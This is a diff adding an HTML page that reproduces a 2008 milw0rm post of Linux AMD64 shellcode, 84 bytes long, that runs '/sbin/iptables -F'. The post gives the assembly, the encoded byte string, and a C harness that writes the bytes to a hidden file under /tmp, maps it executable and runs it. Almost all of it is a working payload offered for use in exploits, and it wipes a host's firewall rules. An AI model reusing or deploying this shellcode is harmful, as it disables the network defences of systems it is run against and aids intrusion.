@@ -1,0 +1,85 @@
+<html><head><title>linux/amd64 flush iptables rules shellcode 84 bytes</title></head><pre>/*
+
+/sbin/iptables -F  shellcode for AMD64 (84 bytes)
+
+By gat3way &lt;gat3way(at )gat3way(dot)eu&gt;
+
+
+The code to load the sc[] into an executable mmap()-ed executable page
+was shamelessly stolen by hophet (too lazy :))
+Thanks Gustavo C. for the inspiration - x86_64 assembly is fun :)
+
+# Here is the boring assembly code:
+# push /sbin/iptables:
+        movq    $0x73656c626174ffff, %rbx
+        shr     $16, %rbx
+        push    %rbx
+        movq    $0x70692f6e6962732f, %rbx
+        push    %rbx
+        movq    %rsp, %rdi
+# push params
+        movq    $0x462dffffffffffff,%rbx
+        shr     $48, %rbx
+        push    %rbx
+        movq    %rsp, %rcx
+        movq    $0x46ffffffffffffff,%rbx
+        shr     $56, %rbx
+        push    %rbx
+        movq    %rsp, %rax
+        xor     %rbx, %rbx
+        push    %rbx
+        push    %rcx
+        push    %rax
+        movq    %rsp,%rsi
+        movq    %rsp,%rdx
+# execve
+        xorq    %rax,%rax
+        mov     $0x3b,%al
+        syscall
+
+
+Hm...pak ne moga da izmislia neshto umno :(
+
+*/
+
+
+
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;err.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+
+char sc[]=&quot;\x48\xbb\xff\xff&quot;
+&quot;\x74\x61\x62\x6c\x65\x73\x48\xc1\xeb\x10\x53\x48\xbb\x2f\x73\x62&quot;
+&quot;\x69\x6e\x2f\x69\x70\x53\x48\x89\xe7\x48\xbb\xff\xff\xff\xff\xff&quot;
+&quot;\xff\x2d\x46\x48\xc1\xeb\x30\x53\x48\x89\xe1\x48\xbb\xff\xff\xff&quot;
+&quot;\xff\xff\xff\xff\x46\x48\xc1\xeb\x38\x53\x48\x89\xe0\x48\x31\xdb&quot;
+&quot;\x53\x51\x50\x48\x89\xe6\x48\x89\xe2\x48\x31\xc0\xb0\x3b\x0f\x05&quot;;
+
+void main()
+{
+        void (*p)();
+        int fd;
+
+        printf(&quot;Lenght: %d\n&quot;, strlen(sc));
+        fd = open(&quot;/tmp/. &quot;, O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);
+        if (fd &lt; 0)
+                err(1, &quot;open&quot;);
+
+        write(fd, sc, strlen(sc));
+        if ((lseek(fd, 0L, SEEK_SET)) &lt; 0)
+                err(1, &quot;lseek&quot;);
+
+        p = (void (*)())mmap(NULL, strlen(sc), PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);
+        if (p == (void (*)())MAP_FAILED)
+                err(1, &quot;mmap&quot;);
+        p();
+        return 0;
+}
+
+// milw0rm.com [2008-11-28]</pre></html>
